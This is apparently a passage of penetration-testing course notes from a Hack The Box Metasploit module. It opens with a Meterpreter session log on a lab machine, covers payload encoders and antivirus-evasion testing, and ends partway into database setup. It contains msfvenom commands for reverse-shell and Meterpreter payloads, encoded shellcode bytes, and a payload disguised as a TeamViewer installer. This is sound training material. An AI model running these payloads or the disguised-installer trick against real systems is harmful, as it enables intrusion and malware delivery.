No matching processes were found.
(Meterpreter 2)(/root/druid) > ps | more
Filtering on 'more'
No matching processes were found.
(Meterpreter 2)(/root/druid) > ps

Process List
============

 PID   PPID  Name                Arch    User              Path
 ---   ----  ----                ----    ----              ----
 1     0     systemd             x86_64  root              /usr/lib/systemd/systemd
 3     2     [rcu_gp]            x86_64  root
 4     2     [rcu_par_gp]        x86_64  root
 6     2     [kworker/0:0H-kblo  x86_64  root
             ckd]
 9     2     [mm_percpu_wq]      x86_64  root
 10    2     [ksoftirqd/0]       x86_64  root
 11    2     [rcu_sched]         x86_64  root
 12    2     [migration/0]       x86_64  root
 13    2     [idle_inject/0]     x86_64  root
 14    2     [cpuhp/0]           x86_64  root
 15    2     [cpuhp/1]           x86_64  root
 16    2     [idle_inject/1]     x86_64  root
 17    2     [migration/1]       x86_64  root
 18    2     [ksoftirqd/1]       x86_64  root
 20    2     [kworker/1:0H-kblo  x86_64  root
             ckd]
 21    2     [kdevtmpfs]         x86_64  root
 22    2     [netns]             x86_64  root
 23    2     [rcu_tasks_kthre]   x86_64  root
 24    2     [kauditd]           x86_64  root
 25    2     [khungtaskd]        x86_64  root
 26    2     [oom_reaper]        x86_64  root
 27    2     [writeback]         x86_64  root
 28    2     [kcompactd0]        x86_64  root
 29    2     [ksmd]              x86_64  root
 30    2     [khugepaged]        x86_64  root
 35    2     [kworker/1:1-event  x86_64  root
             s]
 77    2     [kintegrityd]       x86_64  root
 78    2     [kblockd]           x86_64  root
 79    2     [blkcg_punt_bio]    x86_64  root
 80    2     [tpm_dev_wq]        x86_64  root
 81    2     [ata_sff]           x86_64  root
 82    2     [md]                x86_64  root
 83    2     [edac-poller]       x86_64  root
 84    2     [devfreq_wq]        x86_64  root
 85    2     [watchdogd]         x86_64  root
 88    2     [kswapd0]           x86_64  root
 89    2     [ecryptfs-kthrea]   x86_64  root
 91    2     [kthrotld]          x86_64  root
 92    2     [irq/24-pciehp]     x86_64  root
 93    2     [irq/25-pciehp]     x86_64  root
 94    2     [irq/26-pciehp]     x86_64  root
 95    2     [irq/27-pciehp]     x86_64  root
 96    2     [irq/28-pciehp]     x86_64  root
 97    2     [irq/29-pciehp]     x86_64  root
 98    2     [irq/30-pciehp]     x86_64  root
 99    2     [irq/31-pciehp]     x86_64  root
 100   2     [irq/32-pciehp]     x86_64  root
 101   2     [irq/33-pciehp]     x86_64  root
 102   2     [irq/34-pciehp]     x86_64  root
 103   2     [irq/35-pciehp]     x86_64  root
 104   2     [irq/36-pciehp]     x86_64  root
 105   2     [irq/37-pciehp]     x86_64  root
 106   2     [irq/38-pciehp]     x86_64  root
 107   2     [irq/39-pciehp]     x86_64  root
 108   2     [irq/40-pciehp]     x86_64  root
 109   2     [irq/41-pciehp]     x86_64  root
 110   2     [irq/42-pciehp]     x86_64  root
 111   2     [irq/43-pciehp]     x86_64  root
 112   2     [irq/44-pciehp]     x86_64  root
 113   2     [irq/45-pciehp]     x86_64  root
 114   2     [irq/46-pciehp]     x86_64  root
 115   2     [irq/47-pciehp]     x86_64  root
 116   2     [irq/48-pciehp]     x86_64  root
 117   2     [irq/49-pciehp]     x86_64  root
 118   2     [irq/50-pciehp]     x86_64  root
 119   2     [irq/51-pciehp]     x86_64  root
 120   2     [irq/52-pciehp]     x86_64  root
 121   2     [irq/53-pciehp]     x86_64  root
 122   2     [irq/54-pciehp]     x86_64  root
 123   2     [irq/55-pciehp]     x86_64  root
 124   2     [acpi_thermal_pm]   x86_64  root
 125   2     [scsi_eh_0]         x86_64  root
 126   2     [scsi_tmf_0]        x86_64  root
 127   2     [scsi_eh_1]         x86_64  root
 128   2     [scsi_tmf_1]        x86_64  root
 130   2     [vfio-irqfd-clea]   x86_64  root
 131   2     [ipv6_addrconf]     x86_64  root
 141   2     [kstrp]             x86_64  root
 144   2     [kworker/u5:0]      x86_64  root
 157   2     [charger_manager]   x86_64  root
 202   2     [cryptd]            x86_64  root
 213   2     [irq/16-vmwgfx]     x86_64  root
 217   2     [ttm_swap]          x86_64  root
 218   2     [mpt_poll_0]        x86_64  root
 223   2     [mpt/0]             x86_64  root
 226   2     [scsi_eh_2]         x86_64  root
 238   2     [scsi_tmf_2]        x86_64  root
 239   2     [scsi_eh_3]         x86_64  root
 240   2     [scsi_tmf_3]        x86_64  root
 242   2     [scsi_eh_4]         x86_64  root
 244   2     [scsi_tmf_4]        x86_64  root
 246   2     [scsi_eh_5]         x86_64  root
 247   2     [scsi_tmf_5]        x86_64  root
 248   2     [scsi_eh_6]         x86_64  root
 249   2     [scsi_tmf_6]        x86_64  root
 250   2     [scsi_eh_7]         x86_64  root
 251   2     [scsi_tmf_7]        x86_64  root
 252   2     [scsi_eh_8]         x86_64  root
 253   2     [scsi_tmf_8]        x86_64  root
 254   2     [scsi_eh_9]         x86_64  root
 255   2     [scsi_tmf_9]        x86_64  root
 256   2     [scsi_eh_10]        x86_64  root
 257   2     [scsi_tmf_10]       x86_64  root
 258   2     [scsi_eh_11]        x86_64  root
 259   2     [scsi_tmf_11]       x86_64  root
 260   2     [scsi_eh_12]        x86_64  root
 261   2     [scsi_tmf_12]       x86_64  root
 262   2     [scsi_eh_13]        x86_64  root
 263   2     [scsi_tmf_13]       x86_64  root
 265   2     [scsi_eh_14]        x86_64  root
 266   2     [scsi_tmf_14]       x86_64  root
 267   2     [scsi_eh_15]        x86_64  root
 268   2     [scsi_tmf_15]       x86_64  root
 269   2     [scsi_eh_16]        x86_64  root
 270   2     [scsi_tmf_16]       x86_64  root
 271   2     [scsi_eh_17]        x86_64  root
 272   2     [scsi_tmf_17]       x86_64  root
 273   2     [scsi_eh_18]        x86_64  root
 274   2     [scsi_tmf_18]       x86_64  root
 275   2     [scsi_eh_19]        x86_64  root
 276   2     [scsi_tmf_19]       x86_64  root
 277   2     [scsi_eh_20]        x86_64  root
 278   2     [scsi_tmf_20]       x86_64  root
 279   2     [scsi_eh_21]        x86_64  root
 280   2     [scsi_tmf_21]       x86_64  root
 281   2     [scsi_eh_22]        x86_64  root
 282   2     [scsi_tmf_22]       x86_64  root
 283   2     [scsi_eh_23]        x86_64  root
 284   2     [scsi_tmf_23]       x86_64  root
 285   2     [scsi_eh_24]        x86_64  root
 286   2     [scsi_tmf_24]       x86_64  root
 287   2     [scsi_eh_25]        x86_64  root
 288   2     [scsi_tmf_25]       x86_64  root
 289   2     [scsi_eh_26]        x86_64  root
 290   2     [scsi_tmf_26]       x86_64  root
 291   2     [scsi_eh_27]        x86_64  root
 292   2     [scsi_tmf_27]       x86_64  root
 293   2     [scsi_eh_28]        x86_64  root
 294   2     [scsi_tmf_28]       x86_64  root
 295   2     [scsi_eh_29]        x86_64  root
 296   2     [scsi_tmf_29]       x86_64  root
 297   2     [scsi_eh_30]        x86_64  root
 298   2     [scsi_tmf_30]       x86_64  root
 299   2     [scsi_eh_31]        x86_64  root
 300   2     [scsi_tmf_31]       x86_64  root
 325   2     [kworker/u4:28-eve  x86_64  root
             nts_power_efficien
             t]
 329   2     [scsi_eh_32]        x86_64  root
 330   2     [scsi_tmf_32]       x86_64  root
 331   2     [kworker/0:1H-kblo  x86_64  root
             ckd]
 342   2     [kdmflush]          x86_64  root
 369   2     [raid5wq]           x86_64  root
 413   2     [kworker/1:1H-kblo  x86_64  root
             ckd]
 414   2     [jbd2/dm-0-8]       x86_64  root
 415   2     [ext4-rsv-conver]   x86_64  root
 472   1     systemd-journald    x86_64  root              /usr/lib/systemd/systemd-journal
                                                           d
 494   2     [ipmi-msghandler]   x86_64  root
 504   1     systemd-udevd       x86_64  root              /usr/lib/systemd/systemd-udevd
 519   1     systemd-networkd    x86_64  systemd-network   /usr/lib/systemd/systemd-network
                                                           d
 637   2     [kaluad]            x86_64  root
 638   2     [kmpath_rdacd]      x86_64  root
 639   2     [kmpathd]           x86_64  root
 640   2     [kmpath_handlerd]   x86_64  root
 641   1     multipathd          x86_64  root              /usr/sbin/multipathd
 649   2     [jbd2/sda2-8]       x86_64  root
 650   2     [ext4-rsv-conver]   x86_64  root
 663   1     systemd-timesyncd   x86_64  systemd-timesync  /usr/lib/systemd/systemd-timesyn
                                                           cd
 682   1     VGAuthService       x86_64  root              /usr/bin/VGAuthService
 683   1     vmtoolsd            x86_64  root              /usr/bin/vmtoolsd
 703   1     accounts-daemon     x86_64  root              /usr/lib/accountsservice/account
                                                           s-daemon
 704   1     dhclient            x86_64  root              /usr/sbin/dhclient
 707   1     dbus-daemon         x86_64  messagebus        /usr/bin/dbus-daemon
 714   1     irqbalance          x86_64  root              /usr/sbin/irqbalance
 717   1     python3             x86_64  root              /usr/bin/python3.8
 718   1     polkitd             x86_64  root              /usr/lib/policykit-1/polkitd
 719   1     rsyslogd            x86_64  syslog            /usr/sbin/rsyslogd
 722   1     systemd-logind      x86_64  root              /usr/lib/systemd/systemd-logind
 725   1     udisksd             x86_64  root              /usr/lib/udisks2/udisksd
 739   2     [kworker/1:5-event  x86_64  root
             s]
 759   1     ModemManager        x86_64  root              /usr/sbin/ModemManager
 850   1     systemd-resolved    x86_64  systemd-resolve   /usr/lib/systemd/systemd-resolve
                                                           d
 893   1     freshclam           x86_64  clamav            /usr/bin/freshclam
 899   1     cron                x86_64  root              /usr/sbin/cron
 906   1     python3             x86_64  root              /usr/bin/python3.8
 908   1     atd                 x86_64  root              /usr/sbin/atd
 920   1     perl                x86_64  root              /usr/bin/perl
 925   1     sshd                x86_64  root              /usr/sbin/sshd
 933   1     agetty              x86_64  root              /usr/sbin/agetty
 944   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 945   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 946   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 947   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 948   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 949   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
                                                           4/jre/bin/java
 1154  1     snort               x86_64  snort             /usr/sbin/snort
 2104  2     [kworker/u4:0-even  x86_64  root
             ts_power_efficient
             ]
 2105  2     [kworker/0:0-event  x86_64  root
             s]
 2108  2     [kworker/0:1-event  x86_64  root
             s]
 2262  2     [kworker/u4:1-even  x86_64  root
             ts_power_efficient
             ]
 2309  2     [kworker/1:0-event  x86_64  root
             s]
 2396  945   sh                  x86_64  root              /usr/bin/dash
 2399  2396  axjZtKpt            x86_64  root              /tmp/axjZtKpt

(Meterpreter 2)(/root/druid) > migrate 1
[-] The "migrate" command is not supported by this Meterpreter type (x64/linux)
(Meterpreter 2)(/root/druid) > cd ..
(Meterpreter 2)(/root) > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap

(Meterpreter 2)(/root) > cat flag.txt 
HTB{MSF_Expl01t4t10n}
(Meterpreter 2)(/root) > 
```


# Encoders

Over the 15 years of existence of the Metasploit Framework, `Encoders` have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|

They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

Shikata Ga Nai (`SGN`) was one of the most utilized encoding schemes back in the day because it was very hard to detect payloads encoded through its mechanism. However nowadays, modern detection methods have caught up, and these encoded payloads are far from being universally undetectable anymore. The name (`仕方がない`) means `It cannot be helped` or `Nothing can be done about it`, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. [This article from FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.

## Selecting an Encoder

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called `msfpayload` and `msfencode`. These two tools are located in `/usr/share/framework2/`.

If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

crimsonguard@htb[/htb]`$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai  [*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)  my $buf =  "\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" . "\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" . "\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" . "\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" . "\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" . "\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" . "\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" . "\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" . "\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" . "\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" . "\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" . "\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" . "\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .  <SNIP>`

After 2015, updates to these scripts have combined them within the `msfvenom` tool, which takes care of payload generation and Encoding. We will be talking about `msfvenom` in detail later on. Below is an example of what payload generation would look like with today's `msfvenom`:

#### Generating Payload - Without Encoding

crimsonguard@htb[/htb]`$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl  Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 Payload size: 381 bytes Final size of perl file: 1674 bytes my $buf =  "\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" . "\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" . "\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" . "\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" . "\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .  <SNIP>`

We should now look at the first line of the `$buf` and see how it changes when applying an encoder like `shikata_ga_nai`.

#### Generating Payload - With Encoding

crimsonguard@htb[/htb]`$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai  Found 1 compatible encoders Attempting to encode payload with 3 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 326 (iteration=0) x86/shikata_ga_nai succeeded with size 353 (iteration=1) x86/shikata_ga_nai succeeded with size 380 (iteration=2) x86/shikata_ga_nai chosen with final size 380 Payload size: 380 bytes buf = "" buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31" buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32" buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94" buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e" buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"  <SNIP>`

#### Shikata Ga Nai Encoding

![[Pasted image 20260527144207.png]]
Source: https://hatching.io/blog/metasploit-payloads2/

If we want to look at the functioning of the `shikata_ga_nai` encoder, we can look at an excellent post [here](https://hatching.io/blog/metasploit-payloads2/).

Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.

```shell-session
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up `msfvenom`, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:

crimsonguard@htb[/htb]`$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe  Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 368 (iteration=0) x86/shikata_ga_nai chosen with final size 368 Payload size: 368 bytes Final size of exe file: 73802 bytes Saved as: TeamViewerInstall.exe`

This will generate a payload with the `exe` format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.

![[Pasted image 20260527144220.png]]

One better option would be to try running it through multiple iterations of the same Encoding scheme:

crimsonguard@htb[/htb]`$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe  Found 1 compatible encoders Attempting to encode payload with 10 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 368 (iteration=0) x86/shikata_ga_nai succeeded with size 395 (iteration=1) x86/shikata_ga_nai succeeded with size 422 (iteration=2) x86/shikata_ga_nai succeeded with size 449 (iteration=3) x86/shikata_ga_nai succeeded with size 476 (iteration=4) x86/shikata_ga_nai succeeded with size 503 (iteration=5) x86/shikata_ga_nai succeeded with size 530 (iteration=6) x86/shikata_ga_nai succeeded with size 557 (iteration=7) x86/shikata_ga_nai succeeded with size 584 (iteration=8) x86/shikata_ga_nai succeeded with size 611 (iteration=9) x86/shikata_ga_nai chosen with final size 611 Payload size: 611 bytes Final size of exe file: 73802 bytes Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe`
![[Pasted image 20260527144238.png]]

As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called `msf-virustotal` that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.

#### MSF - VirusTotal

crimsonguard@htb[/htb]`$ msf-virustotal -k <API key> -f TeamViewerInstall.exe  [*] Using API key: <API key> [*] Please wait while I upload TeamViewerInstall.exe... [*] VirusTotal: Scan request successfully queued, come back later for the report [*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130 [*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9 [*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8 [*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343 [*] Requesting the report... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Received code -2. Waiting for another 60 seconds... [*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8 ==================================================================================================================   Antivirus             Detected  Version                                                         Result                                                     Update  ---------             --------  -------                                                         ------                                                     ------  ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505  APEX                  true      6.288                                                           Malicious                                                  20220504  AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505  Acronis               true      1.2.0.108                                                       suspicious                                                 20220426  Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505  AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505  Alibaba               false     0.3.0.5                                                                                                                    20190527  Antiy-AVL             false     3.0                                                                                                                        20220505  Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505  Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505  Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505  Baidu                 false     1.0.0.2                                                                                                                    20190318  BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505  BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428  Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505  CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505  CMC                   false     2.10.2019.1                                                                                                                20211026  ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505  Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505  CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418  Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505  Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505  Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505  DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505  ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505  Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503  Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505  F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505  FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505  Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505  GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505  Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505  Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505  Jiangmin              false     16.0.100                                                                                                                   20220504  K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505  K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505  Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505  Kingsoft              false     2017.9.26.565                                                                                                              20220505  Lionic                false     7.5                                                                                                                        20220505  MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505  Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505  MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505  McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505  McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505  MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505  Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505  NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505  Paloalto              false     0.9.0.1003                                                                                                                 20220505  Panda                 false     4.6.4.2                                                                                                                    20220504  Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505  SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430  Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415  SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330  Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505  Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505  TACHYON               false     2022-05-05.02                                                                                                              20220505  Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505  TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505  TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505  VBA32                 false     5.0.0                                                                                                                      20220505  ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504  VirIT                 false     9.5.188                                                                                                                    20220504  Webroot               false     1.0.0.403                                                                                                                  20220505  Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428  Zillya                false     2.0.0.4625                                                                                                                 20220505  ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505  Zoner                 false     2.2.2.0                                                                                                                    20220504  tehtris               false     v0.1.2                                                                                                                     20220505`

As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion that are outside the scope of this module.

# Databases

`Databases` in `msfconsole` are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.

This is where Databases come into play. `Msfconsole` has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools. Database entries can also be used to configure Exploit module parameters with the already existing findings directly.

## Setting up the Database

First, we must ensure that the PostgreSQL server is up and running on our host machine. To do so, input the following command:

#### PostgreSQL Status

crimsonguard@htb[/htb]`$ sudo service postgresql status  ● postgresql.service - PostgreSQL RDBMS      Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)      Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago     Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)    Main PID: 2147 (code=exited, status=0/SUCCESS)         CPU: 1ms  May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS... May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.`

#### Start PostgreSQL

crimsonguard@htb[/htb]`$ sudo systemctl start postgresql`

After starting PostgreSQL, we need to create and initialize the MSF database with `msfdb init`.

#### MSF - Initiate a Database

